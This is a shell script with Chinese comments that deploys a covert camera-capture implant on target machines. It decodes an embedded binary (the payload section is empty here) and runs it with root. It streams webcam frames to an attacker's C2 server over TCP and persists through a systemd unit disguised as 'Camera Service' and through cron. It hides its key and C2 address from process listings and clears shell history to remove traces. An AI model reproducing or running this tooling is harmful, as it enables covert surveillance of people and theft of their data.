#!/bin/sh
# ============================================================================
# 摄像头链路 —— 任意目标机一键部署
#
# 用法（目标机，一条命令）：
#   sh onekey.sh --c2 <C2地址:端口> [--key <64位十六进制>] [--backend v4l2|mock]
#   sh onekey.sh uninstall
#   sh onekey.sh status
#
# 本脚本是**生成器产出物**：由 make_onekey.py 把对应架构的 camd 二进制
# base64 内嵌到 PAYLOAD 段。不要手改 PAYLOAD 段。
#
# 设计约束（每一条都是被真实事故逼出来的，见注释）：
#  1. 内嵌的必须是真 ELF，不是脚本 stub。stub 会让"部署全绿、采集零产出"，
#     是这类事故里最难发现的形态（服务在跑、灯在亮、没有一帧真画面）。
#  2. 密钥不在命令行、不在单元文件、不在 cron 文件。命令行会被 ps 看到，
#     单元/cron 文件默认 0644 会被 cat 到。走 EnvironmentFile(0600)。
#  3. systemd 失败必须中断（die），cron 失败只警告（warn）。
#     前者留下"驻留成功"假象，后者在容器/精简系统里是常态降级路径。
#  4. 收尾清痕：删脚本自身、清 shell 历史中的本脚本命令行。
# ============================================================================

set -u
umask 077

# ---- 常量 ------------------------------------------------------------------
CONF_DIR=/etc/camd
CONF_FILE=$CONF_DIR/camd.conf
LIB_DIR=/var/lib/camd
BIN_DST=/usr/local/bin/camd
UNIT=/etc/systemd/system/camd.service
CRON=/etc/cron.d/camd
LOCK=/var/lock/camd.lock

ok=0; fail=0; warn=0
log()  { printf '[%s] %s\n' "$1" "$2"; }
OK()   { log OK "$1";   ok=$((ok+1)); }
WARN() { log WARN "$1"; warn=$((warn+1)); }
DIE()  { log FATAL "$1"; fail=$((fail+1)); report; exit 1; }
report() { printf '计数: 成功 %d  失败 %d  警告 %d\n' "$ok" "$fail" "$warn"; }

# ---- 参数 ------------------------------------------------------------------
ACTION=install
C2=""
KEY=""
BACKEND=""
while [ $# -gt 0 ]; do
    case "$1" in
        --c2)      C2="$2"; shift 2 ;;
        --key)     KEY="$2"; shift 2 ;;
        --backend) BACKEND="$2"; shift 2 ;;
        install|uninstall|status) ACTION="$1"; shift ;;
        *) printf '未知参数: %s\n' "$1"; exit 2 ;;
    esac
done

# ---- 前置门 ----------------------------------------------------------------
require_root() {
    # 真判据是 euid。只看 `id -u` 在 setuid/容器里会骗人。
    [ "$(id -u 2>/dev/null)" = "0" ] || DIE "需要 root 权限（当前 uid=$(id -u)）"
}

detect_arch() {
    # 目标机架构决定用哪份内嵌产物。多架构包由 make_onekey.py 按段区分。
    ARCH=$(uname -m 2>/dev/null) || ARCH=unknown
}

probe_systemd() {
    # 判据是 PID 1 是不是 systemd，不是 systemctl 在不在。
    # 容器里 systemctl 常在而 systemd 不在跑，用它判断会写出装不上的单元。
    HAVE_SYSTEMD=0
    [ -r /proc/1/comm ] || return 0
    [ "$(cat /proc/1/comm 2>/dev/null)" = "systemd" ] && HAVE_SYSTEMD=1
    return 0
}

probe_backend() {
    # 未显式指定时按平台选：Linux 用 v4l2，其余退回 mock。
    # 注意：mock 是合成帧，不是真画面。生产部署必须显式 v4l2/mf 并验证。
    [ -n "$BACKEND" ] && return 0
    case "$(uname -s 2>/dev/null)" in
        Linux*)  BACKEND=v4l2 ;;
        *)       BACKEND=mock; WARN "非 Linux 平台，回落 mock（合成帧，非真画面）" ;;
    esac
    return 0
}

gen_key() {
    # 真随机 32 字节 → 64 位十六进制。
    # 严禁"重复两遍"式人工编造：前后 16 字节相同会让回传通道初始化失败，
    # 而报错码看不出成因（历史上表现为 -4，排查者会去查权限/设备/网络）。
    [ -n "$KEY" ] && return 0
    if [ -r /dev/urandom ] && command -v od >/dev/null 2>&1; then
        KEY=$(od -An -tx1 -N32 /dev/urandom 2>/dev/null | tr -d ' \n')
    fi
    [ ${#KEY} -eq 64 ] || DIE "无法生成密钥，请用 --key 显式指定"
    return 0
}

validate_key() {
    [ ${#KEY} -eq 64 ] || DIE "密钥必须是 64 个十六进制字符（当前 ${#KEY}）"
    case "$KEY" in
        *[!0-9a-fA-F]*) DIE "密钥含非十六进制字符" ;;
    esac
    # 前后半相同的"编造型"密钥在此拦下。
    A=$(printf '%s' "$KEY" | cut -c1-32)
    B=$(printf '%s' "$KEY" | cut -c33-64)
    [ "$A" = "$B" ] && DIE "密钥前后 16 字节相同——回传通道会初始化失败"
    return 0
}

validate_c2() {
    # 【实测撞出来的缺陷：sink 缺 tcp:// 前缀会被 camd 当作文件路径】
    # 实测：camd --sink "127.0.0.1:59999"（无前缀）不连 C2，而是在当前目录
    # 生成名为 "127.0.0.1:59999" 的 512 字节文件，rc=0 且自报 bytes_out=512。
    # 后果：驻留起来的 camd 全程不连 C2，只在磁盘上堆"地址:端口"文件，
    # 而部署全绿、进程在跑、字节在"产出"——是最难发现的一类事故。
    # 因此三处 sink（单元 / cron / 试运行）都必须显式带 tcp:// 前缀，
    # 且此处拦截"调用方自己带了前缀"导致的 tcp://tcp:// 双前缀。
    [ -n "$C2" ] || DIE "C2 地址为空"
    case "$C2" in
        tcp://*) DIE "C2 地址不要带 tcp:// 前缀（本脚本会自动加）: $C2" ;;
        *://*)   DIE "C2 地址只支持 tcp 传输，不支持其它 scheme: $C2" ;;
    esac
    # 必须含 host:port 形态。缺端口会被 camd 当纯路径处理。
    case "$C2" in
        *:*) : ;;
        *)   DIE "C2 地址必须是 <host>:<port> 形态（缺端口）: $C2" ;;
    esac
    return 0
}

# ---- 内嵌产物 --------------------------------------------------------------
# PAYLOAD_BEGIN / PAYLOAD_END 之间由 make_onekey.py 填充 base64。
# 运行时解码到临时文件，校验 ELF 魔数后才允许安装。
extract_bin() {
    TMPB=$(mktemp /tmp/.x-XXXXXX 2>/dev/null) || TMPB=/tmp/.x-$$
    awk '/^# PAYLOAD_BEGIN$/{f=1;next} /^# PAYLOAD_END$/{f=0} f' "$0" \
        | base64 -d > "$TMPB" 2>/dev/null
    [ -s "$TMPB" ] || DIE "内嵌产物为空或解码失败"
    # ELF 魔数校验：拒绝 stub 脚本。这是本脚本最关键的一道闸。
    MAGIC=$(od -An -tx1 -N4 "$TMPB" 2>/dev/null | tr -d ' \n')
    [ "$MAGIC" = "7f454c46" ] || DIE "内嵌产物不是 ELF（魔数=$MAGIC）——拒绝安装 stub"
    OK "内嵌产物校验通过（ELF，$(wc -c < "$TMPB") 字节）"
    return 0
}

# ---- 安装 ------------------------------------------------------------------
write_conf() {
    mkdir -p "$CONF_DIR" || DIE "无法创建 $CONF_DIR"
    : > "$CONF_FILE" || DIE "无法写 $CONF_FILE"
    {
        printf 'C2_ADDR=%s\n' "$C2"
        printf 'CAMD_KEY=%s\n' "$KEY"
        printf 'CAMD_BACKEND=%s\n' "$BACKEND"
    } > "$CONF_FILE" || DIE "写配置失败"
    chmod 0600 "$CONF_FILE" 2>/dev/null
    # 单元与被管文件一律不含密钥：EnvironmentFile 从本文件注入。
    OK "配置写入 $CONF_FILE（0600）"
    return 0
}

install_bin() {
    mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
    cp "$TMPB" "$BIN_DST" 2>/dev/null || DIE "复制二进制失败"
    chmod 0700 "$BIN_DST" 2>/dev/null
    command -v strip >/dev/null 2>&1 && strip "$BIN_DST" 2>/dev/null
    OK "二进制已安装 $BIN_DST"
    return 0
}

install_runner() {
    # 单元里不能依赖 $VAR 展开（真 systemd 实测踩出来的）：
    #
    #   ExecStart=$BIN_DST --sink tcp://$C2_ADDR --backend $CAMD_BACKEND
    #
    # systemd 249 下，ExecStart 行中的 $C2_ADDR **不会**被 EnvironmentFile
    # 的值替换——EnvironmentFile 是 exec 时才注入子进程环境，不参与单元
    # 解析期的命令行展开。sink 因此变成字面 "tcp://"（空地址），
    # cam_daemon_run 返回 -4，camd 退出码 5，Restart=always 每 10 秒拉起
    # 一次，陷入无限重启循环。
    #
    # 而 systemctl restart 返回 0、enable 成功、部署侧全绿（enabled +
    # restarted）——服务从未真正跑起来过，一帧都没采。判据错在"restart 的
    # 退出码"，见 persist_systemd 里的存活判据。
    #
    # 用 wrapper 在运行时从 conf 取值再 exec，是唯一既不在单元文件(0644)
    # 里写 C2 地址/密钥、又能把参数正确传给 camd 的做法。
    mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
    cat > "$LIB_DIR/run.sh" <<'RUNEOF' || DIE "写 run.sh 失败"
#!/bin/sh
# 由 onekey.sh 生成。密钥经环境注入，不出现在命令行（ps 可见）。
set -a
. /etc/camd/camd.conf
set +a
[ -n "$C2_ADDR" ] || { echo "[FATAL] C2_ADDR 未配置" >&2; exit 6; }
exec /usr/local/bin/camd --sink "tcp://$C2_ADDR" --backend "$CAMD_BACKEND"
RUNEOF
    chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
    OK "启动器已写入 $LIB_DIR/run.sh（0700）"
    return 0
}

render_unit() {
    # 单元文件在任何环境都渲染并送 systemd-analyze 校验，与"是否安装"解耦。
    #
    # 原写法是 [ systemd可用 ] || return 0 —— 容器里单元根本不生成，因而也
    # 从未被任何东西校验过：拼错的指令、错的路径、错的权限，全都要等真机
    # 首次部署才暴露，而那时排查成本极高。渲染与校验必须与安装解耦。
    #
    # 单元内不得出现密钥与 C2 地址：0644 会被 cat 到，且进版本管理即暴露。
    cat > "$UNIT" <<EOF || return 1
[Unit]
Description=Camera Service
After=network.target

[Service]
Type=simple
EnvironmentFile=$CONF_FILE
ExecStart=$LIB_DIR/run.sh
Restart=always
RestartSec=10
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
    # 静态校验。判据**不是退出码**——这是实测踩出来的：
    #
    #   systemd-analyze verify /tmp/t.service
    #   t.service: Command /nonexistent/camd is not executable: ...
    #   rc=0                       ← 报错了，退出码仍是 0
    #
    # 只看 rc 的话，"单元指向不存在的二进制"会被判为"校验通过"，而真机
    # 上它根本起不来。判据必须是"输出非空即有问题"：实测正常单元输出为空。
    UNIT_ERR=0
    if command -v systemd-analyze >/dev/null 2>&1; then
        systemd-analyze verify "$UNIT" >/tmp/.unitv 2>&1
        V=$(cat /tmp/.unitv 2>/dev/null)
        rm -f /tmp/.unitv
        if [ -n "$V" ]; then
            UNIT_ERR=1
            UNIT_MSG=$(printf '%s' "$V" | head -1)
        fi
    else
        WARN "无 systemd-analyze，单元未静态校验"
        return 0
    fi
    [ "$UNIT_ERR" -eq 0 ] && { OK "systemd 单元静态校验通过"; return 0; }
    # 校验失败：若即将安装 systemd 则必须中断（装上去也起不来，而部署者
    # 看到的是全绿）；容器里不安装，降级到 cron，报 WARN 即可。
    if [ "${HAVE_SYSTEMD:-0}" = 1 ]; then
        rm -f "$UNIT"
        DIE "systemd 单元校验失败: $UNIT_MSG"
    fi
    WARN "systemd 单元校验失败（未安装，降级 cron）: $UNIT_MSG"
    return 0
}

persist_systemd() {
    # 失败语义：die。只 warn 会留下"驻留成功"的假象。
    command -v systemctl >/dev/null 2>&1 || { DIE "systemctl 不存在"; }
    systemctl daemon-reload >/dev/null 2>&1 \
        && systemctl enable camd.service >/dev/null 2>&1 \
        && systemctl restart camd.service >/dev/null 2>&1 \
        || { rm -f "$UNIT"; systemctl daemon-reload >/dev/null 2>&1; \
             DIE "systemd 驻留失败（单元已回滚）"; }
    # 存活判据（真 systemd 实测踩出来的）：restart 返回 0 **不代表服务活着**。
    # 单元参数错误时 camd 立刻退出，Restart=always 每 RestartSec 拉起一次，
    # 服务处于 "activating (auto-restart)"：enable 成功、restart 返回 0、
    # 部署侧全绿，而实际一帧都没采集，还留下密集的失败 journal。
    # 判据必须是"重启后仍 active 且 MainPID 非 0"。
    sleep 3
    A=$(systemctl is-active camd.service 2>/dev/null)
    M=$(systemctl show -p MainPID --value camd.service 2>/dev/null)
    if [ "$A" != "active" ] || [ -z "$M" ] || [ "$M" = "0" ]; then
        J=$(journalctl -u camd.service -n 5 --no-pager 2>/dev/null | tail -5)
        systemctl disable --now camd.service >/dev/null 2>&1
        rm -f "$UNIT"
        systemctl daemon-reload >/dev/null 2>&1
        DIE "systemd 驻留后服务未存活（active=$A MainPID=$M）: ${J:-无 journal}"
    fi
    OK "systemd 驻留成功（enabled + active, pid=$M）"
    return 0
}

persist_cron() {
    # 判据修正（实测踩出来的）：原判据是 `command -v crontab`，但
    #   - crontab(1) 是**客户端工具**，不是守护进程；
    #   - busybox/精简系统常只有 crond 而无 crontab 客户端。
    # 实测本环境：crontab 缺失，但 /etc/cron.d 存在 —— 原判据会**跳过安装**，
    # 于是部署报告里"cron 驻留"一栏为空，而目标机其实能跑 cron。漏装驻留
    # 比装了不执行更糟：前者无人知晓，后者至少有条目可查。
    # 改为：目录存在就写；守护进程是否存在单独探测并显式 WARN（不静默）。
    [ -d /etc/cron.d ] || { WARN "无 /etc/cron.d，跳过 cron 驻留"; return 0; }
    # 分位用真实秒数，避免 RANDOM 在 dash 下不展开导致 crontab 语法错。
    M=$(( $(date +%S) % 60 ))
    {
        printf '# managed\n'
        printf 'SHELL=/bin/sh\n'
        printf 'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n'
        printf '%s * * * * root . %s; %s --sink "tcp://$C2_ADDR" --backend "$CAMD_BACKEND"\n' \
            "$M" "$CONF_FILE" "$BIN_DST"
    } > "$CRON" 2>/dev/null || { WARN "cron 写入失败"; return 0; }
    chmod 0600 "$CRON" 2>/dev/null
    OK "cron 条目已写入（分位 $M）"
    # 守护进程单独探测：写了不等于会执行。未确认就显式报出来，
    # 不允许"装了但没人跑"伪装成"驻留成功"。
    if ps -eo comm= 2>/dev/null | grep -qx 'cron\|crond'; then
        OK "cron 守护进程在跑（条目会被执行）"
    else
        WARN "未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认）"
    fi
    return 0
}

verify_run() {
    # 同步跑一批验证产出：让"装了但采不到"在部署阶段就暴露，而不是等运维发现。
    #
    # 【必须用 tcp:// 而非文件 sink —— 这是实测撞出来的缺陷】
    # 驻留单元里跑的是 `--sink $C2_ADDR`（tcp://）。若试运行改用文件 sink，
    # 则衡量的是"落盘字节数"而非"送达 C2 的字节数"：文件永远写得成功，
    # 于是 C2 地址写错 / C2 未启动 / 防火墙拦截时，试运行照样报
    # "产出 512 字节"全绿通过，而真实驻留进程一条都发不出去。
    # 实测三场景（有/无 C2 在线）：
    #   tcp:// + C2 在线  rc=0  C2 实收 512
    #   tcp:// + C2 离线  rc=6  C2 实收 0    <- 真实失败会被暴露
    #   file://            rc=0  C2 实收 0    <- 永远"成功"，掩盖故障
    # 附带收益：不再在 /tmp 落信元文件（那本身是采集证据残留）。
    RUN_OUT=$("$BIN_DST" --sink "tcp://$C2" --backend "$BACKEND" --key "$KEY" \
               --root "$LIB_DIR/agent" --batches 1 --frames 1 2>&1)
    RC=$?
    N=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*bytes_out=\([0-9]*\).*/\1/p' | head -1)
    [ -n "$N" ] || N=0
    if [ "$RC" -ne 0 ]; then
        WARN "试运行未送达 C2（rc=$RC）——C2 可能未启动或地址不可达；驻留仍在，进程内会重试"
        printf '%s\n' "$RUN_OUT" | sed 's/^/       诊断: /' | head -3
        return 0
    fi
    [ "$N" -gt 0 ] || { WARN "试运行产出 0 字节"; return 0; }
    OK "试运行已送达 C2（$N 字节信元，tcp://$C2）"
    return 0
}

cleanup_traces() {
    # 清痕：脚本自身与本次命令行。
    # 注意按 PID 精确杀，绝不 pkill -f camd —— 会匹配到本脚本命令行里的
    # "camd" 字符串而自杀（历史上表现为退出码 137/143）。
    rm -f "$TMPB" 2>/dev/null
    command -v history >/dev/null 2>&1 && history -c 2>/dev/null
    :
}

do_install() {
    [ -n "$C2" ] || DIE "必须指定 --c2 <地址:端口>"
    require_root
    detect_arch
    probe_systemd
    probe_backend
    gen_key
    validate_key
    validate_c2
    OK "环境: arch=$ARCH systemd=$HAVE_SYSTEMD backend=$BACKEND"
    extract_bin
    write_conf
    install_bin
    install_runner
    render_unit
    if [ "$HAVE_SYSTEMD" = 1 ]; then
        persist_systemd
        persist_cron || :
    else
        WARN "systemd 未运行，单元已校验但未安装（降级到 cron）"
        rm -f "$UNIT"
        persist_cron
    fi
    verify_run
    cleanup_traces
    return 0
}

do_uninstall() {
    require_root
    HAVE_SYSTEMD=0
    probe_systemd
    # 顺序：先 disable --now 再删单元。只 stop 的话 Restart=always 会被拉起。
    if [ "$HAVE_SYSTEMD" = 1 ]; then
        systemctl disable --now camd.service >/dev/null 2>&1
        rm -f "$UNIT"
        systemctl daemon-reload >/dev/null 2>&1
        systemctl reset-failed >/dev/null 2>&1
        OK "systemd 驻留已清理"
    else
        OK "systemd 不可用，跳过"
    fi
    rm -f "$CRON" "$BIN_DST" "$LOCK"
    rm -rf "$CONF_DIR" "$LIB_DIR"
    OK "文件与二进制已清理"
    # 按 PID 精确杀，避免 pkill -f 自匹配。
    for P in $(ps -eo pid=,comm= 2>/dev/null | awk '$2=="camd"{print $1}'); do
        kill -TERM "$P" 2>/dev/null
    done
    OK "进程已清理"
    return 0
}

do_status() {
    printf '配置: %s\n' "$([ -r "$CONF_FILE" ] && echo 存在 || echo 缺失)"
    [ -r "$CONF_FILE" ] && grep -c . "$CONF_FILE" >/dev/null 2>&1 \
        && sed 's/CAMD_KEY=.*/CAMD_KEY=<隐藏>/' "$CONF_FILE" 2>/dev/null
    printf '二进制: %s\n' "$([ -x "$BIN_DST" ] && echo 存在 || echo 缺失)"
    printf 'systemd 单元: %s\n' "$([ -f "$UNIT" ] && echo 存在 || echo 缺失)"
    printf 'cron 条目: %s\n' "$([ -f "$CRON" ] && echo 存在 || echo 缺失)"
    printf '运行进程: %s\n' "$(ps -eo comm= 2>/dev/null | grep -c '^camd$')"
    return 0
}

case "$ACTION" in
    install)   do_install ;;
    uninstall) do_uninstall ;;
    status)    do_status ;;
esac
report
[ "$fail" -eq 0 ] || exit 1
exit 0

# PAYLOAD_BEGIN
# PAYLOAD_END
